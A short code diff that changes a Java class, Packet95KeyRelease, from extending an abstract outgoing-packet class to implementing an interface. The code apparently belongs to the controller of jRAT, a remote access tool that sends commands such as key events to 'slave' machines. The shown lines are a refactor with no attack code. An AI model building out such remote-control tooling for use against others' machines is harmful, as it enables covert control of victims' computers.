@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet95KeyRelease extends AbstractOutgoingPacket {
+public class Packet95KeyRelease implements OutgoingPacket {
 
 	private int keyCode;
 
